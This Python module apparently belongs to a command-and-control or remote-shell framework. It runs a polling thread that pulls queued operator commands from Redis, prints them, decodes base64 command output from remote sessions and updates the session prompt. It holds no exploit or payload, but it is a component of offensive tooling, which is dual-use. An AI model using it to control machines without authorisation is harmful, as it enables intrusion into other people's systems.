#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/sync.py
"""

import threading
import time
from base64 import b64decode
from core.ui import UI


class Sync:

    def __init__(self, config):
        self.config = config
        self.redis = self.config.get("redis")

    def get_cmd_send(self):
        guid = False
        for item in self.redis.get_active_cli_session_cmd(self.config.get("uid")):
            print("\n")
            item = item.decode()
            data = self.redis.get_data(item).decode()
            data = data.split(":", 1)
            guid = item.split(":")[2]
            UI.warn("%s - Sending command: %s" % (data[0], data[1]))
            self.redis.delete_entry(item)
            if data[1] == "exit":
                guid = "exit"
        return guid

    def get_cmd_output(self, guid):
        for item in self.redis.get_active_cli_session_output(self.config.get("uid")):
            print("\n")
            item = item.decode()
            data = b64decode(self.redis.get_data(item)).decode()
            guid = item.split(":")[2]
            UI.warn("Command output:\n%s" % data)
            self.redis.delete_entry(item)
        return guid

    def get_prompt(self, guid):
        if not guid == "exit":
            UI.prompt_no_input(self.redis.get_data("%s:prompt" % guid).decode())
        else:
            UI.prompt_no_input("Main")


def start_cmd_sync(config):
    sync = Sync(config)
    thread = threading.Thread(target=start_cmd_sync_thread, args=(sync,))
    thread.start()


def start_cmd_sync_thread(sync):
    delay = 0
    try:
        delay = float(sync.config.get("cli-sync-delay"))
    except:
        UI.error("cli-sync-delay should be an integer check your config")
        delay = 5
    while True:
        guid = sync.get_cmd_send()
        guid = sync.get_cmd_output(guid)
        if guid:
            sync.get_prompt(guid)
        time.sleep(delay)
